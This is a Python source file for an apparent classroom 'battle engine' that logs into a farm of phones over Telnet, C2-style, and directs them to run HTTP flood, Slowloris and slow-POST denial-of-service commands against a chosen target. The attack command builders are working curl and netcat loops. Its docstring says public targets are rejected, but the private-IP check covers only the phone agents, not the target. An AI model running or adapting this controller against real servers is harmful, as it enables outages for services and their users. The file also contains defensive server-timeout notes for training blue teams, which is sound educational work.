"""
ZYLON FUSION v2.5 - Academy Battle Engine
==========================================

WHAT THIS DOES:
    Telnet-based controller that connects to YOUR phone farm on YOUR local network.
    You add your phones by IP + port + username + password (same as Telnet login).
    ZYLON sends HTTP test commands to each phone, phones execute them against YOUR target.
    Blue team students watch the target and try to defend.

HOW IT WORKS (step by step):
    1. You add agents: "add" → enter IP, port, username, password for each phone
    2. ZYLON connects to each phone via Telnet (same as you typing in terminal)
    3. You set target: YOUR DVWA or local server URL
    4. You pick a phase (recon/flood/slowloris/slowpost)
    5. ZYLON sends curl/nc commands to each phone via Telnet
    6. Each phone runs the commands → sends HTTP requests to target
    7. ZYLON collects results (HTTP status codes) from each phone
    8. Ctrl+C = EMERGENCY STOP → ZYLON sends kill signal to all phones

SECURITY:
    - ONLY works on private/local IPs (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
    - Will REJECT any public IP for agents or targets
    - All traffic stays on YOUR network

FLOW DIAGRAM:
    ZYLON (your laptop)
        │
        ├── Telnet ──→ Phone 1 (192.168.1.10) ──curl──→ DVWA (192.168.1.100)
        ├── Telnet ──→ Phone 2 (192.168.1.11) ──curl──→ DVWA (192.168.1.100)
        ├── Telnet ──→ Phone 3 (192.168.1.12) ──curl──→ DVWA (192.168.1.100)
        └── Ctrl+C ──→ kills all phones instantly

TERMUX COMPATIBLE: Yes - auto-detects Termux Android and uses compatible commands
"""

# ============================================================================
# IMPORTS - What each library does
# ============================================================================

import telnetlib   # Python's built-in Telnet client - connects to remote terminals
import socket      # Low-level networking - used for timeout/connection errors
import threading   # Runs multiple tasks at the same time (one thread per phone)
import time        # Sleep/delays and timestamps
import json        # JSON data handling
import random      # Random numbers for cache-busting URL parameters
from datetime import datetime  # Timestamps for battle stats

# Rich library - makes terminal output look pretty with colors, tables, panels
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box

console = Console()


# ============================================================================
# PRIVATE IP CHECK
# ============================================================================
# This is the SAFETY GATE - it prevents you from accidentally adding
# a public IP (like google.com or someone else's server).
# Only allows IPs on YOUR local network.

def is_private_ip(ip):
    """
    Check if IP address is in private/local range (RFC 1918 standard).
    
    Private IP ranges (these are YOUR internal network IPs):
        - 10.0.0.0 to 10.255.255.255    (Class A private - big networks)
        - 172.16.0.0 to 172.31.255.255   (Class B private - medium networks)  
        - 192.168.0.0 to 192.168.255.255 (Class C private - home/office WiFi)
        - 127.0.0.0 to 127.255.255.255   (localhost - your own machine)
    
    Public IPs like 8.8.8.8, 142.250.x.x etc. will be REJECTED.
    
    HOW IT WORKS:
        1. Split IP into 4 parts (e.g., "192.168.1.10" → [192, 168, 1, 10])
        2. Check if first number matches any private range
        3. Return True (private/safe) or False (public/blocked)
    """
    try:
        parts = ip.split('.')
        if len(parts) != 4:  # Valid IP must have exactly 4 numbers
            return False
        octets = [int(p) for p in parts]
        
        # 10.x.x.x → Used by large private networks
        if octets[0] == 10:
            return True
        
        # 172.16.x.x to 172.31.x.x → Used by medium private networks
        if octets[0] == 172 and 16 <= octets[1] <= 31:
            return True
        
        # 192.168.x.x → Most common home/office WiFi range
        if octets[0] == 192 and octets[1] == 168:
            return True
        
        # 127.x.x.x → Localhost (your own machine)
        if octets[0] == 127:
            return True
            
    except (ValueError, IndexError):
        return False
    return False


# ============================================================================
# TELNET AGENT CLASS - Represents ONE phone in your farm
# ============================================================================
# 
# Each phone in your farm is represented by a TelnetAgent object.
# When you "add" a phone, ZYLON creates a TelnetAgent for it.
# When you "connect", it logs into the phone via Telnet (like SSH but simpler).
# When you run a phase, it sends commands to the phone.
#
# TELNET BASICS:
#   - Telnet is an old protocol for remote terminal access (like SSH but unencrypted)
#   - Your phones run a Telnet server (sshd with telnet enabled or busybox telnetd)
#   - ZYLON connects as a client, logs in, and types commands
#   - It's like you sitting at each phone and typing curl commands manually

class TelnetAgent:
    """
    Represents a single phone agent connected via Telnet.
    
    Each agent stores:
        - host: Phone's IP address (e.g., 192.168.1.10)
        - port: Telnet port (usually 23 for standard Telnet)
        - username: Login username (e.g., "admin")
        - password: Login password
        - connected: Whether we're currently logged in
        - os_type: "termux" (Android) or "linux" (determines which commands to use)
    """
    
    def __init__(self, host, port, username, password, agent_id=0):
        # Connection details - you provide these when adding an agent
        self.host = host              # Phone's IP on your local network
        self.port = port              # Telnet port (23 is default)
        self.username = username      # Telnet login username
        self.password = password      # Telnet login password
        self.agent_id = agent_id      # Auto-assigned number (1, 2, 3...)
        
        # State tracking
        self.connected = False        # Are we currently logged into this phone?
        self.tn = None               # The actual Telnet connection object
        self.os_type = None          # 'termux' or 'linux' - auto-detected after login
        self.busy = False            # Is this phone currently running commands?
        self.requests_sent = 0       # How many requests this phone has sent
        self.last_status = "Disconnected"  # Current status for display
    
    def connect(self, timeout=10):
        """
        Connect to this phone via Telnet and log in.
        
        STEP BY STEP:
            1. Create Telnet connection to host:port
            2. Wait for "login: " prompt
            3. Type the username + Enter
            4. Wait for "Password: " prompt
            5. Type the password + Enter
            6. Wait for shell prompt ($ or #)
            7. If we get a shell → connected! Auto-detect OS type.
            8. If timeout or auth fails → mark as failed
        
        This is exactly what happens when YOU open a terminal and type:
            $ telnet 192.168.1.10
            login: admin
            Password: ****
            $ _
        """
        try:
            # Step 1: Open Telnet connection
            self.tn = telnetlib.Telnet(self.host, self.port, timeout=timeout)
            
            # Step 2: Wait for login prompt (most Telnet servers show "login: ")
            self.tn.read_until(b"login: ", timeout=5)
            # Step 3: Send username
            self.tn.write(self.username.encode() + b"\n")
            
            # Step 4: Wait for password prompt
            self.tn.read_until(b"Password: ", timeout=5)
            # Step 5: Send password
            self.tn.write(self.password.encode() + b"\n")
            
            # Step 6: Wait for shell prompt ($ for normal user, # for root)
            response = self.tn.read_until(b"$ ", timeout=5)
            if b"$ " in response or b"# " in response:
                # Login successful!
                self.connected = True
                self.last_status = "Connected"
                
                # Step 7: Auto-detect what OS the phone is running
                # This matters because Termux Android uses slightly different commands
                self.tn.write(b"uname -a 2>/dev/null || echo TERMUX_ANDROID\n")
                resp = self.tn.read_until(b"$ ", timeout=5).decode('utf-8', errors='ignore')
                if "TERMUX" in resp or "android" in resp.lower():
                    self.os_type = "termux"   # Android phone with Termux
                else:
                    self.os_type = "linux"    # Standard Linux
                
                return True, "Connected"
            else:
                # Login failed - wrong username/password
                self.last_status = "Auth failed"
                return False, "Authentication failed"
                
        except socket.timeout:
            # Phone didn't respond - might be off or wrong IP
            self.last_status = "Timeout"
            return False, "Connection timeout"
        except ConnectionRefusedError:
            # Phone refused connection - Telnet not running on that port
            self.last_status = "Refused"
            return False, "Connection refused"
        except Exception as e:
            # Any other error
            self.last_status = f"Error: {str(e)[:30]}"
            return False, str(e)[:50]
    
    def execute(self, command, timeout=10):
        """
        Run a shell command on this phone and get the output.
        
        HOW IT WORKS:
            1. Send the command string + newline (like pressing Enter)
            2. Read everything until we see the shell prompt ($ ) again
            3. The text between is the command output
        
        Example: If we send "curl -s http://target.com", 
        we get back something like "200 OK..." then the prompt.
        """
        if not self.connected or not self.tn:
            return False, "Not connected"
        
        try:
            # Send command (encode string to bytes, add newline)
            self.tn.write(command.encode() + b"\n")
            # Read until shell prompt appears (means command finished)
            response = self.tn.read_until(b"$ ", timeout=timeout)
            return True, response.decode('utf-8', errors='ignore')
        except Exception as e:
            self.last_status = f"Exec error: {str(e)[:20]}"
            return False, str(e)[:50]
    
    def send_stop(self):
        """
        EMERGENCY STOP - Kill whatever this phone is doing.
        
        HOW IT WORKS:
            1. Send Ctrl+C (\x03) - this interrupts the running command
            2. Send it twice for good measure (some programs need double Ctrl+C)
            3. Also run pkill to kill any leftover curl/wget processes
            4. This ensures the phone stops IMMEDIATELY
        
        \x03 is the ASCII code for Ctrl+C in Telnet.
        """
        if not self.connected or not self.tn:
            return
        try:
            # Send Ctrl+C signal twice
            self.tn.write(b"\x03")     # \x03 = Ctrl+C in Telnet protocol
            time.sleep(0.2)
            self.tn.write(b"\x03")     # Send again to be sure
            time.sleep(0.2)
            
            # Kill any remaining curl/wget processes that might still be running
            # pkill -f kills processes matching the pattern
            self.tn.write(b"pkill -f 'curl.*zylon' 2>/dev/null; pkill -f 'wget.*zylon' 2>/dev/null\n")
            time.sleep(0.3)
            
            self.busy = False
            self.last_status = "Stopped"
        except Exception:
            pass
    
    def disconnect(self):
        """
        Gracefully disconnect from this phone.
        Sends stop signal first, then logs out and closes connection.
        """
        self.send_stop()  # Make sure nothing is running
        try:
            if self.tn:
                self.tn.write(b"exit\n")  # Log out of Telnet session
                self.tn.close()           # Close the connection
        except Exception:
            pass
        self.connected = False
        self.last_status = "Disconnected"


# ============================================================================
# BATTLE ENGINE - The main controller
# ============================================================================
# 
# This is the brain of Battle Mode. It:
#   - Manages all your phone agents (add, connect, disconnect)
#   - Builds the commands that get sent to each phone
#   - Runs the 4 battle phases (recon, flood, slowloris, slowpost)
#   - Tracks statistics (requests sent, blocked, etc.)
#   - Has emergency stop functionality

class BattleEngine:
    """
    Academy Battle Engine - Red Team vs Blue Team Controller.
    
    ARCHITECTURE:
        ZYLON (controller) ──Telnet──→ Phone 1 ──curl──→ Target
                                ├──Telnet──→ Phone 2 ──curl──→ Target
                                └──Telnet──→ Phone 3 ──curl──→ Target
    
    The controller never sends traffic directly to the target.
    It only tells the phones WHAT to do, and they do it.
    This is the same pattern as a real C2 (Command & Control) system,
    but restricted to YOUR local network only.
    """
    
    def __init__(self):
        self.agents = []           # List of TelnetAgent objects (your phones)
        self.target = None         # Target URL (your DVWA or local server)
        self.running = False       # Is a battle phase currently running?
        
        # _stop_flag is used for thread-safe stopping
        # When set, all agent threads check this and stop
        self._stop_flag = threading.Event()
        
        # Battle statistics - tracked across all phases
        self.stats = {
            'total_requests': 0,   # Total HTTP requests sent by all phones
            'successful': 0,       # Requests that got 200-399 response
            'blocked': 0,          # Requests that got 429/503/403 (defended!)
            'errors': 0,           # Connection errors, timeouts, etc.
            'start_time': None,    # When the battle started
            'agents_active': 0,    # How many phones are connected
            'phases_run': 0        # How many phases have been run
        }
    
    def add_agent(self, host, port, username, password):
        """
        Add a phone to the farm.
        
        SECURITY CHECK: Only allows private/local IPs.
        If someone tries to add 8.8.8.8 or any public IP, it gets BLOCKED.
        This prevents accidental (or intentional) use against non-local targets.
        """
        # Security gate - reject non-local IPs
        if not is_private_ip(host):
            return False, f"BLOCKED: {host} is not a local/private IP. Battle Mode only works on YOUR local network."
        
        agent_id = len(self.agents) + 1  # Auto-number: 1, 2, 3...
        agent = TelnetAgent(host, port, username, password, agent_id)
        self.agents.append(agent)
        return True, f"Agent {agent_id} added ({host}:{port})"
    
    def connect_all(self):
        """
        Connect to ALL registered agents at once.
        Returns a list of results showing which phones connected and which failed.
        """
        if not self.agents:
            return False, "No agents registered"
        
        results = []
        connected = 0
        
        for agent in self.agents:
            success, msg = agent.connect(timeout=8)
            results.append((agent.agent_id, agent.host, success, msg))
            if success:
                connected += 1
        
        self.stats['agents_active'] = connected
        return connected > 0, results
    
    def disconnect_all(self):
        """
        EMERGENCY DISCONNECT - Stop all agents and close all connections.
        Called when you press Ctrl+C or type 'stop'.
        """
        self._stop_flag.set()   # Signal all threads to stop
        self.running = False
        for agent in self.agents:
            agent.send_stop()     # Send Ctrl+C to each phone
            agent.disconnect()    # Close Telnet connection
    
    # ========================================================================
    # COMMAND BUILDERS
    # ========================================================================
    # These methods build shell commands that get sent to each phone.
    # The phone's shell executes them (like typing in terminal).
    # We use curl for HTTP requests and nc (netcat) for raw TCP.
    
    def _build_curl_command(self, target_url, method="GET", path="/", 
                             threads=1, count=10, delay=0.1):
        """
        Build a curl-based test command.
        
        WHAT THIS GENERATES (example for 5 requests):
            for i in $(seq 1 5); do
                curl -s -o /dev/null -w '%{http_code}'
                    -X GET
                    -H 'User-Agent: ZYLONAcademy-RedTeam'
                    'http://192.168.1.100/?zylon=$RANDOM'
                    2>/dev/null && echo '';
                sleep 0.1;
            done
        
        BREAKDOWN:
            - for i in $(seq 1 N)    → Loop N times
            - curl -s                → Silent mode (no progress bar)
            - -o /dev/null           → Don't save response body
            - -w '%{http_code}'      → Only print HTTP status code (200, 403, etc.)
            - -X GET                 → HTTP method
            - ?zylon=$RANDOM         → Random URL parameter (bypasses caching)
            - 2>/dev/null            → Hide error messages
            - sleep 0.1              → Small delay between requests
        
        $RANDOM is a bash variable that generates a random number each time.
        This makes every request unique so the server can't cache it.
        """
        if self.agents and self.agents[0].os_type == "termux":
            # Termux Android - slightly different curl syntax
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}}' "
                f"-X {method} "
                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
                f"-H 'X-Test-Request: $i' "
                f"'{target_url}{path}?zylon=$RANDOM' "
                f"2>/dev/null && echo ''; "
                f"sleep {delay}; "
                f"done"
            )
        else:
            # Standard Linux
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}}\\n' "
                f"-X {method} "
                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
                f"-H 'X-Test-Request: $i' "
                f"'{target_url}{path}?zylon=$RANDOM' "
                f"2>/dev/null; "
                f"sleep {delay}; "
                f"done"
            )
        return cmd
    
    def _build_flood_command(self, target_url, count=50, path="/"):
        """
        Build a rapid-fire flood command.
        
        DIFFERENCE FROM NORMAL CURL:
            - No sleep between requests (maximum speed)
            - --max-time 5 (timeout each request after 5 seconds)
            - Status codes printed on same line (faster parsing)
            - Same ?q=$RANDOM cache-busting technique as the Go script
        
        This is the Bash equivalent of the Go HTTPS flood you saw,
        but using curl instead of raw TLS sockets.
        """
        if self.agents and self.agents[0].os_type == "termux":
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}} ' "
                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
                f"'{target_url}{path}?q=$RANDOM' "
                f"--max-time 5 2>/dev/null; "
                f"done; echo ''"
            )
        else:
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}} ' "
                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
                f"'{target_url}{path}?q=$RANDOM' "
                f"--max-time 5 2>/dev/null; "
                f"done; echo ''"
            )
        return cmd
    
    def _build_slowloris_command(self, target_host, target_port=80, count=5):
        """
        Build a Slowloris-style test command using netcat (nc).
        
        HOW SLOWLORIS WORKS:
            1. Open TCP connection to target
            2. Send partial HTTP headers (missing the final \r\n\r\n)
            3. Server waits for the rest of the request...
            4. Every few seconds, send another header line (keep-alive)
            5. Server keeps waiting... holding a worker thread open
            6. If server has limited workers (Apache default: 150),
               150 slow connections = server can't serve anyone else
        
        THE COMMAND (simplified):
            echo -ne 'GET / HTTP/1.1\r\nHost: target\r\nX-Keep: alive\r\n'
            sleep 3  ← wait 3 seconds (server is still waiting for complete request)
            echo -ne 'X-Keep: alive\r\n'  ← send another header to keep connection alive
            sleep 3
            echo -ne 'X-Keep: alive\r\n'
        
        Pipe this into nc (netcat) which sends it to the target.
        The & at the end runs each connection in the background.
        """
        cmd = (
            f"for i in $(seq 1 {count}); do "
            # Open slow connection - send partial headers (NO \r\n\r\n at end)
            f"(echo -ne 'GET /slowloris-test-{random.randint(1000,9999)} HTTP/1.1\\r\\n"
            f"Host: {target_host}\\r\\n"
            f"User-Agent: ZYLONAcademy-RedTeam\\r\\n"
            f"X-Keep-{random.randint(1000,9999)}: alive\\r\\n'; "
            # Wait 3 seconds - server is still holding the connection open
            f"sleep 3; "
            # Send another header to keep connection alive
            f"echo -ne 'X-Keep-{random.randint(1000,9999)}: alive\\r\\n'; "
            f"sleep 3; "
            f"echo -ne 'X-Keep-{random.randint(1000,9999)}: alive\\r\\n'; "
            f"sleep 2) | nc -w 15 {target_host} {target_port} 2>/dev/null & "
            # & = run in background so we can open multiple connections
            f"done; "
            f"wait; echo 'DONE'"  # Wait for all background connections to finish
        )
        return cmd
    
    # ========================================================================
    # RESULT COLLECTOR - Runs in a thread for each phone
    # ========================================================================
    
    def _run_agent_command(self, agent, command, result_list, lock):
        """
        Send a command to one agent and collect the results.
        
        WHY THREADING:
            - Each phone runs independently (don't wait for one to finish)
            - threading.Lock() prevents two threads from writing results at the same time
            - lock = a mutex (only one thread can hold it at a time)
            - "with lock:" = acquire lock, do work, release lock
        
        HOW STATUS CODES ARE PARSED:
            The curl -w '%{http_code}' outputs numbers like "200" or "403".
            We split the response text and look for 3-digit numbers.
            Then classify them:
                200-399 = successful (target responded normally)
                429/503/403/508 = blocked (defense is working!)
                anything else = error
        """
        agent.busy = True
        agent.last_status = "Attacking"
        success, response = agent.execute(command, timeout=120)
        
        with lock:  # Only one thread can write results at a time
            result_list.append({
                'agent_id': agent.agent_id,
                'host': agent.host,
                'success': success,
                'response': response[:500] if response else "",  # Limit response size
            })
            
            if success:
                # Parse HTTP status codes from the response text
                # curl -w '%{http_code}' outputs status codes like "200 200 403 200"
                codes_found = []
                for word in response.split():
                    word = word.strip()
                    if word.isdigit() and len(word) == 3:  # 3-digit number = HTTP status
                        codes_found.append(int(word))
                
                # Update global stats
                self.stats['total_requests'] += len(codes_found)
                for code in codes_found:
                    if 200 <= code < 400:
                        # 200-399 = success (target responded)
                        self.stats['successful'] += 1
                    elif code in [429, 503, 403, 508]:
                        # 429 = Too Many Requests (rate limiting working)
                        # 503 = Service Unavailable (WAF/CDN blocking)
                        # 403 = Forbidden (WAF blocking)
                        # 508 = Loop Detected (CDN loop)
                        self.stats['blocked'] += 1
                    else:
                        self.stats['errors'] += 1
            
            agent.busy = False
            agent.last_status = "Idle"
    
    # ========================================================================
    # BATTLE PHASES
    # ========================================================================
    # Each phase tests a different type of DoS attack:
    #   Phase 1 (Recon):      Light probing - just 5 requests per phone
    #   Phase 2 (Flood):      Rapid HTTP requests - 50+ per phone
    #   Phase 3 (Slowloris):  Slow connection exhaustion
    #   Phase 4 (Slow POST):  Slow body upload
    
    def phase_recon(self, target_url):
        """
        PHASE 1: Reconnaissance - Light probing.
        
        Each phone sends just 5 gentle requests with 0.5s delay.
        This tests if the target is alive and responding normally.
        Good for checking: Is the target up? What status codes does it return?
        
        If even 5 requests get blocked → target has aggressive rate limiting.
        If all 5 succeed → target has NO basic protection.
        """
        self._stop_flag.clear()  # Reset stop flag for new phase
        self.stats['phases_run'] += 1
        
        console.print(f"\n[bold cyan][PHASE 1] Reconnaissance - Light probing[/bold cyan]")
        console.print(f"[dim]   Each agent sends 5 gentle requests to map target[/dim]")
        
        results = []
        lock = threading.Lock()       # Thread-safe result collection
        threads = []
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            # Build curl command: 5 requests, 0.5 second delay between each
            cmd = self._build_curl_command(target_url, count=5, delay=0.5)
            # Start a thread for this phone
            t = threading.Thread(target=self._run_agent_command, 
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        # Wait for all threads to finish (max 60 seconds)
        for t in threads:
            t.join(timeout=60)
        
        # Show results per phone
        for r in results:
            status = "OK" if r['success'] else "FAIL"
            console.print(f"  [{status}] Agent {r['agent_id']} ({r['host']}): "
                         f"{len([w for w in r['response'].split() if w.isdigit() and len(w)==3])} responses")
        
        return results
    
    def phase_flood(self, target_url, requests_per_agent=50, path="/"):
        """
        PHASE 2: HTTP Flood - Rapid fire requests.
        
        Each phone sends 50+ requests as fast as possible.
        No delay between requests = maximum throughput.
        
        This simulates a real Layer 7 DDoS flood attack.
        Blue team should see their rate limiting kick in.
        
        IF: >10% requests blocked → Blue team defense is working
        IF: <10% blocked → Target is vulnerable to flood attacks
        
        MATH:
            5 phones × 50 requests = 250 requests total
            If target blocks after 30 requests → block rate = 30/250 = 12%
            That means rate limiting IS working (good for blue team)
        """
        self._stop_flag.clear()
        self.stats['phases_run'] += 1
        
        agent_count = sum(1 for a in self.agents if a.connected)
        total_requests = agent_count * requests_per_agent
        
        console.print(f"\n[bold red][PHASE 2] HTTP Flood - {agent_count} agents x {requests_per_agent} requests[/bold red]")
        console.print(f"[dim]   Total: ~{total_requests} requests | Ctrl+C = EMERGENCY STOP[/dim]")
        
        results = []
        lock = threading.Lock()
        threads = []
        self.running = True
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            cmd = self._build_flood_command(target_url, count=requests_per_agent, path=path)
            t = threading.Thread(target=self._run_agent_command,
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        # Wait for all phones to finish (max 3 minutes)
        for t in threads:
            t.join(timeout=180)
        
        self.running = False
        
        # Calculate block rate - tells us how well the defense is working
        blocked = self.stats['blocked']
        total = self.stats['total_requests']
        if total > 0:
            block_rate = (blocked / total) * 100
            if block_rate > 10:
                # More than 10% blocked = defense is working
                console.print(f"\n  [green]Blue Team Defense: {block_rate:.0f}% requests blocked![/green]")
            else:
                # Less than 10% blocked = target is vulnerable
                console.print(f"\n  [red]Red Team Success: Only {block_rate:.0f}% blocked - target vulnerable![/red]")
        
        return results
    
    def phase_slowloris(self, target_host, target_port=80, connections_per_agent=3):
        """
        PHASE 3: Slowloris - Slow connection exhaustion.
        
        Each phone opens multiple slow connections.
        Sends partial headers, then keeps sending keep-alive headers every 3 seconds.
        Server holds each connection open, using up its worker threads.
        
        DEFENSE AGAINST SLOWLORIS:
            Apache: Set Timeout 30, MaxRequestWorkers 150
            Nginx:  client_body_timeout 12s, keepalive_timeout 10s
            HAProxy: timeout client 10s, timeout http-request 5s
        
        If blue team configures these correctly, slow connections get dropped.
        If NOT configured → slow connections stay open → server can't serve real users.
        """
        self._stop_flag.clear()
        self.stats['phases_run'] += 1
        
        console.print(f"\n[bold yellow][PHASE 3] Slowloris - Slow connection exhaustion[/bold yellow]")
        console.print(f"[dim]   Each agent opens {connections_per_agent} slow connections[/dim]")
        
        results = []
        lock = threading.Lock()
        threads = []
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            cmd = self._build_slowloris_command(target_host, target_port, 
                                                 count=connections_per_agent)
            t = threading.Thread(target=self._run_agent_command,
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=60)
        
        return results
    
    def phase_slow_post(self, target_url, connections_per_agent=2):
        """
        PHASE 4: Slow POST - Slow body upload.
        
        Sends a POST request with Content-Length: 65536 (64KB)
        but sends the actual data very slowly (16 bytes at a time with delays).
        Server waits for the full 64KB... and waits... and waits...
        
        This ties up server resources because:
        - Server allocates buffer for 64KB body
        - Server holds connection waiting for data
        - Each slow POST = one less connection for real users
        
        DEFENSE:
            - Limit request body size
            - Set minimum data rate (MinRate in Apache)
            - Timeout slow uploads
        """
        self._stop_flag.clear()
        self.stats['phases_run'] += 1
        
        console.print(f"\n[bold magenta][PHASE 4] Slow POST - Slow body upload[/bold magenta]")
        
        results = []
        lock = threading.Lock()
        threads = []
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            
            if agent.os_type == "termux":
                # Termux: Use netcat to send raw POST with slow data
                # This sends headers first, then body data very slowly
                cmd = (
                    f"for i in $(seq 1 {connections_per_agent}); do "
                    f"(echo -ne 'POST /slowpost-test HTTP/1.1\\r\\n"
                    f"Host: {target_url.split('//')[1].split('/')[0] if '//' in target_url else target_url}\\r\\n"
                    f"Content-Type: application/x-www-form-urlencoded\\r\\n"
                    f"Content-Length: 65536\\r\\n"  # Tell server to expect 64KB
                    f"Connection: keep-alive\\r\\n\\r\\n'; "
                    # Send body data very slowly - 16 bytes every 0.5 seconds
                    f"for j in $(seq 1 100); do "
                    f"echo -ne 'A=AAAAAAAAAAAAAAAA'; sleep 0.5; "
                    f"done) | nc -w 30 {target_url.split('//')[1].split('/')[0] if '//' in target_url else target_url} 80 2>/dev/null & "
                    f"done; wait; echo 'DONE'"
                )
            else:
                # Linux: Use curl with --limit-rate for slow upload
                cmd = (
                    f"for i in $(seq 1 {connections_per_agent}); do "
                    f"curl -s -X POST '{target_url}/slowpost-test' "
                    f"-H 'Content-Type: application/x-www-form-urlencoded' "
                    f"-H 'Transfer-Encoding: chunked' "
                    f"--limit-rate 16 -d 'A=AAAA' "  # Limit to 16 bytes/sec
                    f"--max-time 30 2>/dev/null; "
                    f"done; echo 'DONE'"
                )
            
            t = threading.Thread(target=self._run_agent_command,
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=60)
        
        return results
    
    # ========================================================================
    # UTILITY METHODS
    # ========================================================================
    
    def get_agent_status(self):
        """Get status of all agents as a list of dictionaries"""
        status_list = []
        for agent in self.agents:
            status_list.append({
                'id': agent.agent_id,
                'host': agent.host,
                'port': agent.port,
                'connected': agent.connected,
                'os_type': agent.os_type,
                'busy': agent.busy,
                'status': agent.last_status,
                'requests_sent': agent.requests_sent
            })
        return status_list
    
    def get_stats(self):
        """Get battle statistics including requests per second"""
        elapsed = 0
        if self.stats['start_time']:
            elapsed = round(time.time() - self.stats['start_time'], 1)
        
        return {
            **self.stats,
            'elapsed_seconds': elapsed,
            # Requests per second = total requests / elapsed time
            'requests_per_second': round(self.stats['total_requests'] / max(elapsed, 1), 1),
            'agents_total': len(self.agents),
            'agents_active': sum(1 for a in self.agents if a.connected)
        }
    
    def display_dashboard(self):
        """
        Display a live battle dashboard showing:
            - Agent table: which phones are connected, their OS, status
            - Stats panel: total requests, blocked rate, requests/sec
        
        This is what blue team and red team see during the exercise.
        """
        stats = self.get_stats()
        
        # Agent status table
        agent_table = Table(
            title="[bold red]Agent Status[/bold red]",
            box=box.ROUNDED, border_style="red"
        )
        agent_table.add_column("ID", style="yellow", width=4)
        agent_table.add_column("Host", style="cyan", width=18)
        agent_table.add_column("OS", style="green", width=8)
        agent_table.add_column("Connected", style="green", width=10)
        agent_table.add_column("Status", style="white", width=15)
        
        for agent in self.agents:
            conn = "YES" if agent.connected else "NO"
            agent_table.add_row(
                str(agent.agent_id),
                f"{agent.host}:{agent.port}",
                agent.os_type or "?",
                conn,
                agent.last_status
            )
        
        console.print(agent_table)
        
        # Stats panel
        console.print(Panel(
            f"[bold]Battle Statistics[/bold]\n\n"
            f"  Agents Active: [green]{stats['agents_active']}/{stats['agents_total']}[/green]\n"
            f"  Total Requests: [cyan]{stats['total_requests']}[/cyan]\n"
            f"  Successful: [green]{stats['successful']}[/green] | "
            f"Blocked: [red]{stats['blocked']}[/red] | "
            f"Errors: [yellow]{stats['errors']}[/yellow]\n"
            f"  Requests/sec: [bold]{stats['requests_per_second']}[/bold]\n"
            f"  Phases Run: {stats['phases_run']}\n"
            f"  Elapsed: {stats['elapsed_seconds']}s",
            title="[bold red]Battle Dashboard[/bold red]",
            border_style="red",
            box=box.HEAVY
        ))
